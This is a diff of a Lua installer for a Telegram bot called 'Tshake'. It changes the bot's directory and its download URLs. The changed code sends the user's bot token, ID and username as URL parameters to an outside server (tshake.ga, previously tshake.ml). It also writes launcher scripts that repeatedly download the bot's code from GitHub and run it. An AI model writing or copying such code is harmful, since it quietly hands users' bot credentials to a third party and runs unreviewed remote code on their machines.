@@ -64,14 +64,14 @@ os.execute('lua start.lua')
 end
 local function Files_Tshake_Info()
 Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
-http.request("http://tshake.ml/add/?id="..database:get(Server_Tshake.."Id_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
+https.request("https://tshake.ga/Tshakex/?token="..database:get(Server_Tshake.."Token_Tshake").."&user="..database:get(Server_Tshake.."UserName_Tshake").."&id="..database:get(Server_Tshake.."Id_Tshake"))
 local RunTshake = io.open("Tshake", 'w')
 RunTshake:write([[
 #!/usr/bin/env bash
-cd $HOME/Tshake
+cd $HOME/tshakex2
 token="]]..database:get(Server_Tshake.."Token_Tshake")..[["
 rm -fr Tshake.lua
-wget "https://raw.githubusercontent.com/tshakeab/Tshake/master/Tshake.lua"
+wget "https://raw.githubusercontent.com/TshAkETEAM/tshakex2/master/Tshake.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./Tshake.lua -p PROFILE --bot=$token
@@ -81,11 +81,11 @@ RunTshake:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/Tshake
+cd $HOME/tshakex2
 while(true) do
 rm -fr ../.telegram-cli
-screen -S Tshake -X kill
-screen -S Tshake ./Tshake
+screen -S tshakex2 -X kill
+screen -S tshakex2 ./Tshake
 done
 ]])
 RunTs:close()
